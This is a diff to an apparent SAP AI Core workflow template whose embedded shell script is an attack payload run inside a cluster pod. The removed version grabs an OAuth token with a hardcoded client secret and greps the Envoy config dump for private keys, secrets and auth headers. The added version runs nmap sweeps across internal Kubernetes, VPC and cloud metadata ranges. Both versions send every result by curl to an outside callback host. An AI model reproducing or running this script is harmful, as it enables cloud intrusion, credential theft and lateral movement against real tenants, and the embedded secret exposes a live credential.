@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "7.0.0"
+    ai.sap.com/version: "8.0.0"
 spec:
   entrypoint: main
   templates:
@@ -27,139 +27,82 @@ spec:
         CB="https://www.masonhck.tech/cb.php"
         post() { curl -k -s -X POST "${CB}?src=$1" --max-time 10 -d @- ; }
         get() { curl -k -s "${CB}?src=$1" --max-time 5 ; }
-        chunk() { split -b 600 - /tmp/chunk_ && for f in /tmp/chunk_*; do cat "$f" | post "$1-$(basename $f)"; rm "$f"; done ; }
 
-        get "recon7-start-$(hostname)"
+        get "recon8-start-$(hostname)"
 
-        # Get JWT
-        TOKEN=$(curl -k -s -X POST "https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com/oauth/token" \
-          -H "Content-Type: application/x-www-form-urlencoded" \
-          -d "grant_type=client_credentials" \
-          -d "client_id=sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784" \
-          -d "client_secret=aicore-bb-14-key\$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc=" \
-          | grep -oE '"access_token":"[^"]+' | cut -d'"' -f4)
-        echo "token_len=$(echo -n $TOKEN | wc -c)" | post "recon7-token"
+        # Pod network info
+        ip addr show 2>&1 | post "recon8-ipaddr"
+        ip route show 2>&1 | post "recon8-routes"
+        cat /etc/resolv.conf 2>&1 | post "recon8-resolv"
 
-        # === 1. ENVOY CONFIG DUMP ===
-        curl -s "http://127.0.0.1:15000/config_dump" > /tmp/cdump.json
-        wc -c /tmp/cdump.json | post "recon7-cdump-size"
+        PORTS="80,443,2049,2379,2380,3000,3100,3306,4317,4318,5432,5601,6379,6443,8080,8200,8443,8888,9090,9200,9300,10250,10255,15010,15014,27017,44134"
 
-        # TLS certificates and private keys
-        grep -i "inline_bytes\|inline_string\|private_key\|certificate_chain\|trusted_ca\|tls_certificate" /tmp/cdump.json | head -c 1800 | post "recon7-cdump-tls"
+        # === SCAN 1: K8s Service CIDR (100.104.0.0/24) ===
+        nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 100.104.0.0/24 -oG /tmp/scan1.txt 2>&1 | tail -5 | post "recon8-scan1-summary"
+        grep "open" /tmp/scan1.txt | head -c 1800 | post "recon8-scan1-open"
 
-        # Secrets, tokens, passwords, AWS keys
-        grep -i "secret\|password\|access_key\|aws_\|api_key\|credential" /tmp/cdump.json | head -c 1800 | post "recon7-cdump-secrets"
-
-        # Auth headers injected by Istio
-        grep -i "authorization\|x-forwarded\|x-envoy\|x-request-id\|request_headers_to_add" /tmp/cdump.json | head -c 1800 | post "recon7-cdump-headers"
-
-        # Check for Loki, Helm, NFS, EFS references in config
-        grep -i "loki\|helm\|tiller\|nfs\|efs\|grafana\|kibana\|elastic" /tmp/cdump.json | head -c 1800 | post "recon7-cdump-refs"
-
-        # Transport socket configs (mTLS cert details)
-        grep -B2 -A10 "transport_socket" /tmp/cdump.json | head -c 1800 | post "recon7-cdump-transport-1"
-        grep -B2 -A10 "transport_socket" /tmp/cdump.json | sed -n '30,80p' | head -c 1800 | post "recon7-cdump-transport-2"
-
-        # Secret discovery service (SDS) refs
-        grep -i "sds\|secret_name\|ROOTCA\|default\|istiod" /tmp/cdump.json | head -c 1800 | post "recon7-cdump-sds"
-
-        # === 2. LOKI PROBE (port 3100) ===
-        # Search Envoy clusters for Loki
-        curl -s "http://127.0.0.1:15000/clusters" | grep -i "loki" | head -c 700 | post "recon7-loki-envoy"
-
-        # DNS brute force for Loki service
-        for ns in logging loki monitoring default kube-system; do
-          nslookup loki.${ns}.svc.cluster.local 100.104.0.10 2>&1 | grep -v "^$" | head -c 300 | post "recon7-loki-dns-${ns}"
+        # === SCAN 2: K8s Service CIDR extended (100.104.1-10.0/24) ===
+        for i in 1 2 3 4 5 7 8 9 10; do
+          nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 100.104.${i}.0/24 -oG - 2>/dev/null | grep "open" >> /tmp/scan2.txt
         done
-        nslookup loki-gateway.logging.svc.cluster.local 100.104.0.10 2>&1 | head -c 300 | post "recon7-loki-gw-dns"
+        wc -l /tmp/scan2.txt 2>/dev/null | post "recon8-scan2-count"
+        head -c 1800 /tmp/scan2.txt 2>/dev/null | post "recon8-scan2-open"
 
-        # Scan known service IPs for port 3100
-        for ip in 100.104.0.1 100.104.7.43 100.110.1.63 100.104.178.234 100.109.200.238 100.110.10.25 100.98.92.225; do
-          curl -s --connect-timeout 2 "http://${ip}:3100/config" 2>&1 | head -c 700 | post "recon7-loki-ip-${ip}"
+        # === SCAN 3: OTel/monitoring range (100.110.0.0/24) ===
+        nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 100.110.0.0/24 -oG /tmp/scan3.txt 2>&1 | tail -5 | post "recon8-scan3-summary"
+        grep "open" /tmp/scan3.txt | head -c 1800 | post "recon8-scan3-open"
+
+        # === SCAN 4: Second OTel range (100.109.0.0/24) ===
+        nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 100.109.0.0/24 -oG /tmp/scan4.txt 2>&1 | tail -5 | post "recon8-scan4-summary"
+        grep "open" /tmp/scan4.txt | head -c 1800 | post "recon8-scan4-open"
+
+        # === SCAN 5: Third range (100.98.0.0/24) ===
+        nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 100.98.0.0/24 -oG /tmp/scan5.txt 2>&1 | tail -5 | post "recon8-scan5-summary"
+        grep "open" /tmp/scan5.txt | head -c 1800 | post "recon8-scan5-open"
+
+        # === SCAN 6: Egress gateway range (100.64.56-68.0/24) ===
+        for i in 56 57 58 59 60 61 62 63 64 65 66 67 68; do
+          nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 100.64.${i}.0/24 -oG - 2>/dev/null | grep "open" >> /tmp/scan6.txt
         done
+        wc -l /tmp/scan6.txt 2>/dev/null | post "recon8-scan6-count"
+        head -c 1800 /tmp/scan6.txt 2>/dev/null | post "recon8-scan6-open"
 
-        # Try Loki on common cluster IP range (quick sweep)
-        for i in 1 2 3 4 5 10 20 50 100 150 200; do
-          curl -s --connect-timeout 1 "http://100.104.${i}.1:3100/ready" 2>&1 | head -c 200 | post "recon7-loki-scan-104-${i}"
+        # === SCAN 7: VPC private ranges ===
+        nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 10.0.0.0/24 -oG /tmp/scan7a.txt 2>&1 | tail -3 | post "recon8-scan7a-summary"
+        grep "open" /tmp/scan7a.txt | head -c 1800 | post "recon8-scan7a-open"
+        nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 172.20.0.0/24 -oG /tmp/scan7b.txt 2>&1 | tail -3 | post "recon8-scan7b-summary"
+        grep "open" /tmp/scan7b.txt | head -c 1800 | post "recon8-scan7b-open"
+
+        # === SCAN 8: Pod's own subnet ===
+        MY_IP=$(ip -4 addr show eth0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1)
+        MY_NET=$(echo $MY_IP | sed 's/\.[0-9]*$/.0/')
+        echo "pod_ip=${MY_IP} subnet=${MY_NET}/24" | post "recon8-pod-subnet"
+        nmap -sT -T4 --open --min-rate 500 -p ${PORTS} ${MY_NET}/24 -oG /tmp/scan8.txt 2>&1 | tail -5 | post "recon8-scan8-summary"
+        grep "open" /tmp/scan8.txt | head -c 1800 | post "recon8-scan8-open"
+
+        # === SCAN 9: IMDS and link-local ===
+        nmap -sT -T4 --open -p 80,443 169.254.169.254 -oG - 2>&1 | tail -3 | post "recon8-imds"
+        nmap -sT -T4 --open -p 80,443 169.254.170.2 -oG - 2>&1 | tail -3 | post "recon8-ecs-meta"
+
+        # === SCAN 10: Broader K8s service range 100.104.100-200 ===
+        for i in 50 100 150 178 200; do
+          nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 100.104.${i}.0/24 -oG - 2>/dev/null | grep "open" >> /tmp/scan10.txt
         done
+        wc -l /tmp/scan10.txt 2>/dev/null | post "recon8-scan10-count"
+        head -c 1800 /tmp/scan10.txt 2>/dev/null | post "recon8-scan10-open"
 
-        # === 3. HELM/TILLER PROBE (port 44134) ===
-        grep -i "tiller\|helm" /tmp/cdump.json | head -c 700 | post "recon7-helm-envoy"
-        for ip in 100.104.0.1 100.104.7.43 127.0.0.1; do
-          ncat -w 2 -z ${ip} 44134 2>&1 && echo "OPEN" | post "recon7-tiller-${ip}" || echo "CLOSED" | post "recon7-tiller-${ip}"
-        done
-        # DNS for tiller
-        nslookup tiller-deploy.kube-system.svc.cluster.local 100.104.0.10 2>&1 | head -c 300 | post "recon7-tiller-dns"
+        # === AGGREGATE: All open ports across all scans ===
+        cat /tmp/scan*.txt 2>/dev/null | grep "open" | sort -u > /tmp/all_open.txt
+        wc -l /tmp/all_open.txt | post "recon8-total-open"
+        head -c 1800 /tmp/all_open.txt | post "recon8-all-open-1"
+        tail -c +1801 /tmp/all_open.txt | head -c 1800 | post "recon8-all-open-2"
+        tail -c +3601 /tmp/all_open.txt | head -c 1800 | post "recon8-all-open-3"
 
-        # === 4. NFS/EFS PROBE (port 2049) ===
-        # Get pod IP and subnet
-        ip addr show 2>&1 | head -c 500 | post "recon7-pod-network"
-
-        # Check for NFS mounts already present
-        mount 2>&1 | head -c 500 | post "recon7-mounts"
-        df -h 2>&1 | head -c 500 | post "recon7-df"
-
-        # Scan for NFS on known IPs
-        for ip in 100.104.0.1 100.64.56.14 100.64.58.80 100.64.67.13; do
-          ncat -w 2 -z ${ip} 2049 2>&1 && echo "OPEN" | post "recon7-nfs-${ip}" || echo "CLOSED" | post "recon7-nfs-${ip}"
-        done
-
-        # Check for EFS DNS (AWS pattern)
-        nslookup fs-*.efs.eu-central-1.amazonaws.com 2>&1 | head -c 300 | post "recon7-efs-dns"
-        # Scan common EFS IPs in VPC
-        for i in 1 2 3 4 5; do
-          ncat -w 1 -z 10.0.${i}.1 2049 2>&1 && echo "OPEN" | post "recon7-efs-10-0-${i}" || echo "CLOSED" | post "recon7-efs-10-0-${i}"
-        done
-
-        # === 5. KUBE-STATE-METRICS ===
-        # Find KSM services from Envoy
-        curl -s "http://127.0.0.1:15000/clusters" | grep -oE '[a-z0-9-]+\.opentelemetry\.svc\.cluster\.local' | sort -u | head -c 700 | post "recon7-otel-svcs"
-
-        # Try KSM on port 8080 and 8443
-        for svc in $(curl -s "http://127.0.0.1:15000/clusters" | grep -oE 'ksm-[a-z0-9-]+\.opentelemetry\.svc\.cluster\.local' | sort -u | head -3); do
-          curl -s --connect-timeout 3 "http://${svc}:8080/metrics" 2>&1 | head -c 700 | post "recon7-ksm-8080-$(echo $svc | cut -d. -f1)"
-          curl -s --connect-timeout 3 "http://${svc}:8443/metrics" 2>&1 | head -c 700 | post "recon7-ksm-8443-$(echo $svc | cut -d. -f1)"
-        done
-
-        # Try KSM via kube-state-metrics default
-        nslookup kube-state-metrics.kube-system.svc.cluster.local 100.104.0.10 2>&1 | head -c 300 | post "recon7-ksm-dns"
-
-        # === 6. USAGE API WITH JWT ===
-        curl -s --connect-timeout 5 "http://usage-api-service.usage-api.svc.cluster.local/" \
-          -H "Authorization: Bearer ${TOKEN}" 2>&1 | head -c 700 | post "recon7-usage-bearer"
-        curl -s --connect-timeout 5 "http://usage-api-service.usage-api.svc.cluster.local/api/v1/usage" \
-          -H "Authorization: Bearer ${TOKEN}" 2>&1 | head -c 700 | post "recon7-usage-api"
-        curl -s --connect-timeout 5 "http://usage-api-service.usage-api.svc.cluster.local/health" 2>&1 | head -c 700 | post "recon7-usage-health"
-
-        # === 7. MLFLOW ADDITIONAL ENDPOINTS ===
-        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
-        curl -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/registered-models/list" \
-          -H "Authorization: Bearer ${TOKEN}" 2>&1 | head -c 700 | post "recon7-mlflow-models"
-        curl -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/artifacts/list" \
-          -H "Authorization: Bearer ${TOKEN}" 2>&1 | head -c 700 | post "recon7-mlflow-artifacts"
-        curl -s --connect-timeout 5 "${TRACK}/health" 2>&1 | head -c 700 | post "recon7-mlflow-health"
-        curl -s --connect-timeout 5 "${TRACK}/version" 2>&1 | head -c 700 | post "recon7-mlflow-version"
-
-        # === 8. BROAD PORT SCAN ===
-        # Quick scan of key internal IPs for interesting ports
-        for ip in 100.104.0.1 100.104.7.43; do
-          for port in 3100 4317 4318 5601 8080 8200 8443 9090 9200 9300 15010 15014 44134; do
-            ncat -w 1 -z ${ip} ${port} 2>&1 && echo "${ip}:${port} OPEN" | post "recon7-scan" || true
-          done
-        done
-
-        # === 9. DYNATRACE ACTIVEGATE ===
-        curl -s "http://127.0.0.1:15000/clusters" | grep -oE '[a-z0-9-]+\.dynatrace\.svc\.cluster\.local' | sort -u | head -c 500 | post "recon7-dyna-svcs"
-        for svc in $(curl -s "http://127.0.0.1:15000/clusters" | grep -oE '[a-z0-9-]+\.dynatrace\.svc\.cluster\.local' | sort -u | head -3); do
-          curl -s --connect-timeout 3 "http://${svc}:443/" 2>&1 | head -c 500 | post "recon7-dyna-$(echo $svc | cut -d. -f1)"
-          curl -s --connect-timeout 3 "https://${svc}:443/rest/health" -k 2>&1 | head -c 500 | post "recon7-dyna-health-$(echo $svc | cut -d. -f1)"
-        done
-
-        get "recon7-done-$(hostname)"
+        get "recon8-done-$(hostname)"
       resources:
         limits:
-          cpu: "1"
-          memory: "1Gi"
+          cpu: "2"
+          memory: "2Gi"
         requests:
-          cpu: "100m"
-          memory: "256Mi"
+          cpu: "500m"
+          memory: "512Mi"
